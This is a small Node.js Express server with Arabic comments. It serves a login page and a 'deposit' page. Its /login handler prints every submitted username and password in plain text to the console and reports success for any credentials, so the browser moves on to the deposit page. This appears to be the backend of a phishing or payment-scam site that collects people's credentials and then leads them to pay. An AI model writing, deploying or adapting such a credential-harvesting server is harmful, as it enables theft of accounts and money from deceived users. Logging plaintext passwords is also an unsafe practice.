const express = require('express');
const path = require('path');
const app = express();

// إعدادات ضرورية لاستقبال البيانات من الصفحة
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

// عرض صفحة تسجيل الدخول الرئيسية
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// عرض صفحة الإيداع
app.get('/deposit', (req, res) => {
    res.sendFile(path.join(__dirname, 'deposit.html'));
});

// استقبال بيانات الدخول والتحويل لصفحة الإيداع
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    console.log(`بيانات دخول جديدة: ${username} | ${password}`);
    // نرسل رد بالنجاح لكي يقوم المتصفح بالتحويل
    res.json({ success: true });
});

app.listen(8080, '0.0.0.0', () => {
    console.log('السيرفر يعمل الآن على منفذ 8080');
});